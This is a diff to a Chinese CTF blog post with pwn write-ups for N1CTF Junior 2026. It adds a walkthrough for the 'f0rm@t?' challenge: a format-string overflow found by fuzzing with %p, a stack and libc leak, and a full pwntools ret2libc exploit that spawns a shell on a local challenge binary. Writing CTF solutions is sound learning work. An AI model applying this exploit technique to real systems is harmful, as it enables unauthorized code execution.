@@ -1,12 +1,15 @@
 ---
 title: N1CTF Junior 2026 1/2 Pwn 部分题解
 published: 2026-01-27
+updated: 2026-01-28
 tags: [WriteUp, Pwn]
 category: CTF
 draft: false
 ---
 
 好久没写题解了
+
+Updated: f0rm@t?赛后复现
 
 # ez_canary
 
@@ -640,6 +643,94 @@ frame.rip = 0x4011cd
 
 payload = flat(b'/bin/sh\x00', b'\x00'*0x20, elf.plt['signal'], bytes(frame))
 sl(payload)
+
+itr()
+```
+
+
+# f0rm@t? （赛后复现）
+
+应该先fuzz一下的，而不是通过静态分析直接看出漏洞
+
+首先可以发现发送262个`%p`程序会正常结束，但发送263个`%p`会段错误
+
+在printf结束处下断点，发现返回地址变成了栈上残留的一个libc函数地址
+
+找到了一个附近的栈返回
+
+![image-114514](./8.png)
+
+而前面已经知道栈地址，能够控制`rbp`，现在只需一个`1/16`的爆破就可以让程序返回`main`
+
+（一般栈上会留一个`main`地址）
+
+刚刚的printf已经泄露出libc基址，直接`ret2libc`
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux')
+# context.log_level = 'debug'
+context.terminal = ['tmux', 'splitw', '-h']
+file = './chal'
+elf = ELF(file)
+libc = ELF('./libc.so.6')
+
+choice = 0
+if choice:
+    port =   0
+    target = ''
+    p = remote(target, port)
+else:
+    p = process(file, aslr=True)
+
+io = p
+
+def debug(cmd=''):
+    if choice==1:
+        return
+    gdb.attach(p, gdbscript=cmd)
+
+
+s       = lambda data               :p.send(data)
+sl      = lambda data               :p.sendline(data)
+sa      = lambda x,data             :p.sendafter(x, data)
+sla     = lambda x,data             :p.sendlineafter(x, data)
+r       = lambda num=4096           :p.recv(num)
+rl      = lambda num=4096           :p.recvline(num)
+ru      = lambda x                  :p.recvuntil(x)
+itr     = lambda                    :p.interactive()
+uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
+uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
+uru64   = lambda                    :uu64(ru('\x7f')[-6:])
+leak    = lambda name               :log.success('{} = {}'.format(name, hex(eval(name))))
+
+# debug('brva 0x0015D8')
+
+ru(b'1 2 256 ')
+stack = int(rl(), 16)
+leak('stack')
+
+payload = b'%p.'*263
+payload = payload.ljust(8*(257-6), b'A')
+payload += p64(stack+0x10c8-8)*6
+payload += p16(0xf572)
+
+ru(b'...\n> ')
+s(payload)
+
+libc.address = int(r(50).decode().split('.')[2], 16) - 0x11ba91
+leak('libc.address')
+
+payload = b'%p.'*265
+payload = payload.ljust(8*(257-6), b'A')
+payload += p64(stack+0x10c8-8)*6
+payload += p64(libc.address + 0x10f78b)
+payload += p64(libc.search(b'/bin/sh\x00').__next__())
+payload += p64(libc.sym['system'])
+
+ru(b'...\n> ')
+s(payload)
 
 itr()
 ```
